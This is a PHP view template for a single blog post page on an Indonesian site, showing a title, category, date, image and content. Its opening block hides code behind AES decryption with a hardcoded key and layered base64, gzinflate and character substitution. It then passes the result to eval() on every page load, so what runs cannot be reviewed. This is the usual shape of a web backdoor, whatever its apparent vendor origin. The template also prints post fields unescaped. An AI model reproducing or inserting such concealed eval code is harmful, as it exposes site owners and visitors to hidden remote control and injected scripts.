<?php
function lexxtyw($pesan, $encryption_key){
  $key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; 
} $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = lexxtyw('+BtLreY/FfN+m9GD0yGfdNobObc/rJ8/45/TE5kpXWTWpzOFytsaXp91lLZVzdqPREbr7o6BeJE0TLfS5cU2GLfui10BsbsMaB8jPVU4YW4hYaaloNLFpPhPPY2Awt58lW79a8NM5WUx/rOZabYh77nZH6xG0DjeESAyvU+IabSyQpvBoFWgzpesM8SYgOx2fhuvqJfneZw76e7MhXuyDTbyrgRSHE+5SZJ/4gFDqUx896W/KkvBwfJDNZXe/8bqnVI2z/ojRyx9PpulH+TYIpZrsGt1190f',$private_secret_key); 
$SISTEMIT_COM_ENC = "21r0u/Dx66LfGupvf3/9qFfwtkBd03qryuuP2Q/zXv3O22q7VSXe3TUkWh0moh5rzcu1dasKXD638llhzuv4wse/iyo1QMI6W5WCXX1cnUO2am11C/L33QpV6uXv6bf18bPfRVv9/aBieq8/Ak0AiYFYYAXZX1/9Tn9Y9BpFEVzQFi6PLBru4RrkuhXmQlt1uPPVlTQhrs1CODTt96vkt/Ffi4q+QpwLVAZRhM0joQEujiGuMB8Eu4Zs/fv6dznQMDClvdWQkN0A";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>
 <!-- Page breadcrumb -->
 <section id="mu-page-breadcrumb">
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div class="mu-page-breadcrumb-area">
           <h2><?= $j['judul'] ?></h2>
           <ol class="breadcrumb">
            <li class="active"><?= $j['kategorinya'] ?></li>
            <li>Waktu Publikasi : <?= htw($j['waktu']); ?></a> WITA</li>            
          </ol>
         </div>
       </div>
     </div>
   </div>
 </section>

 <section id="mu-course-content" style="padding : 15px 0">
   <div class="container">
     <div class="row">
       <div class="col-md-12">
         <div class="mu-course-content-area">
            <div class="row">
              <div class="col-md-9">
                <!-- start course content container -->
                <div class="mu-course-container mu-blog-single">
                  <div class="row">
                    <div class="col-md-12">
                      <article class="mu-blog-single-item">
                        <figure class="mu-blog-single-img">
                        <a href="<?= $j['thumb'] ?>"><img alt="img" src="<?= $j['thumb'] ?>" style="max-height:fit-content"></a>                      
                        </figure>
                        <div class="mu-blog-description">
                          <?= $j['konten'] ?>
                        </div>
                      </article>
                    </div>                                   
                  </div>
                </div>
              </div>
              <div class="col-md-3">
              <?php require('sidebar.php') ?>
             </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 </section>
<?php require('foot.php') ?>